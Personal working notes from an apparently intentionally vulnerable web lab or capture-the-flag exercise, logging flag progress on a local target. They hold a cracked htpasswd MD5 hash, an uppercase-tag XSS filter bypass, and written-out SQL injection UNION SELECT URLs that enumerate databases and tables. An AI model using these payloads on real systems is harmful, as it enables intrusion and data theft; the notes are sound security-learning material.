# VirtualBox settings
1. System->Processor-> enable PAE
2. Host-only Adapter, name vboxnet0

# Notes to self
## robots.txt
* Hints at directories: `/whatever`, `/.hidden`

## /whatever/
* Contains `htpasswd`: `root:8621ffdbc5698829397d97767ac13db3`
* `reverseMD5(8621ffdbc5698829397d97767ac13db3)` == dragon
  * https://md5.gromweb.com/?md5=8621ffdbc5698829397d97767ac13db3
* dragon is not the root account's password, however
* The login form uses GET, which is an interesting choice

## /.hidden/
* Lots of directories with random names, with similar directories as children
* `README` file: `Do you want help? Me too` in French
* All files modified 11.9.2001 21:21 ('9/11')
* Each child dir begins with a different letter a..z
```shell
#(best run in `goinfre`)
wget --recursive -e robots=off --no-parent 'http://192.168.99.100/.hidden/'
cd 192.168.99.100/.hidden
grep -r '5' . # Tried ls -lR | grep flag, grep -r -i 'flag' ., etc.
# I suspected it's some kind of hex so tried searching for 5, and...
```

`99dde1d35d1fdd283924d84e6d9f1d820` is 1 character too long to be an MD5 hash, removing first or last doesn't seem to be a hash either. Probably too short to be a flag. Doesn't make sense as hex ASCII either.

## Albatross (1 flag got)
* The URL is odd ?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c (64 characters, too)

## Feedback
* The **name** field allows HTML injection. Lowercase `<script>` (lowercase) tags are filtered out. XSS **is** possible, e.g. `<SCRIPT>` works fine.
* Name can be left empty with `validate_required = () => true;`, is saved correctly

## Database
* There are 5 databases (+ information_schema):
  * `Member_Brute_Force, Member_Sql_Injection, Member_guestbook, Member_images, Member_survey`
  * http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+catalog_name%2C+schema_name+FROM+information_schema.schemata&Submit=Submit#
* The databases contain the following tables:
  * Member_Brute_Force: db_default
  * Member_Sql_Injection: users
  * Member_guestbook: guestbook
  * Member_images: list_images
  * Member_survey: vote_dbs
  * http://192.168.99.100/?page=member&id=1+AND+1%3D2+UNION+SELECT+table_schema%2C+table_name+FROM+information_schema.tables&Submit=Submit#
* The database uses InnoDB

## Image upload notes (1 flag got)
* Hidden input field `MAX_FILE_SIZE` sounds like a constant that should be on the server. The default is 100 kB, editing it doesn't appear to allow uploading larger files.
* MIME-type must be jpg
* Images are not added to database even if successfully uploaded (at least not `list_images`)
* Trying to upload multiple images appears to discard all but one of them

# Flag count
9/14
